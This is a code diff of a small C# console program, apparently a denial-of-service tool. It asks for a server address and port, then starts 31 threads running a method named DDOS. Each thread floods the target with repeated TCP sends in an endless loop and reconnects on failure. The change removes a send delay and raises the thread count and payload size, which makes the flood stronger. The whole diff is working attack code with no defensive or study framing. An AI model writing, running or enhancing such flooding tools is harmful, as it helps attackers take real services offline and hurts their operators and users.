@@ -16,21 +16,22 @@ class Program
     public static int Port;
     public static int count = 0;
     public static Socket? socket;
-    static async Task Main()
+    public static byte[] data = Encoding.UTF8.GetBytes("DataDataDataDataDataDataDataDataDataDataDataDataDataDataDataData");
+    static void Main()
     {
         Console.Clear();
-        Console.Write("服务器 |  Server: ");
         bool isDomainName = false;
         string DomainPattern = @"^(?:[a-zA-Z0-9](?:[a-zA-Z0-9]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z0-9]{0,}$";
         Regex ymregex = new Regex(DomainPattern);
         while (!isDomainName)
         {
+            Console.Write("服务器 |  Server: ");
             IP = Console.ReadLine();
             isDomainName = ymregex.IsMatch(IP);
             if (!isDomainName)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("\n非法地址 | Invalid input");
+                Console.WriteLine("非法地址 | Invalid input");
                 Console.ResetColor();
             }
         }
@@ -44,48 +45,47 @@ class Program
             else
             {
                 Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("\n非法端口 | Invalid input");
+                Console.WriteLine("非法端口 | Invalid input");
                 Console.ResetColor();
             }
         }
-        for (int i = 0; i < 16; i++)
+        for (int i = 1; i < 32; i++)
         {
-            Console.WriteLine("Thread\u0020"+i+"\u0020starts.");
+            Thread t = new(DDOS);
+            t.Start();
+            Console.WriteLine("Thread\u0020" + i + "\u0020starts.");
+        }
+        while (true){Task.WaitAll();}
+    }
+    static async void DDOS()
+    {
+        socket = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+        socket.Connect(IP, Port);
+        while (true)
+        {
+            //Thread.Sleep(5);
             Task.Run(() =>
             {
-                socket = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                socket.Connect(IP, Port);
-                while (true)
+                try
                 {
-                    Thread.Sleep(10);
-                    Task.Run(() =>
-                    {
-                        byte[] data = Encoding.UTF8.GetBytes("DataDataDataDataDataDataDataData");
-                        try
-                        {
-                            socket.Send(data);
-                            Console.Clear();
-                            Console.ForegroundColor = ConsoleColor.Green;
-                            Console.Write("OK");
-                            Console.ResetColor();
-                            Console.Write("\u0020time =" + count++);
-                        }
-                        catch (Exception)
-                        {
-                            Console.Clear();
-                            Console.ForegroundColor = ConsoleColor.Red;
-                            Console.Write("错误: ERROR At\u0020" + count++ + "\u0020turns.");
-                            Console.ResetColor();
-                            socket = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                            socket.Connect(IP, Port);
-                        }
-                        return;
-                    });
+                    socket.Send(data);
+                    Console.Clear();
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Console.Write("OK");
+                    Console.ResetColor();
+                    Console.Write("\u0020time =" + count++);
                 }
+                catch (Exception)
+                {
+                    Console.Clear();
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.Write("错误: ERROR At\u0020" + count++ + "\u0020turns.");
+                    Console.ResetColor();
+                    socket = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                    socket.Connect(IP, Port);
+                }
+                return;
             });
-        }
-        while(true) {
-            Task.WaitAll();
         }
     }
 }
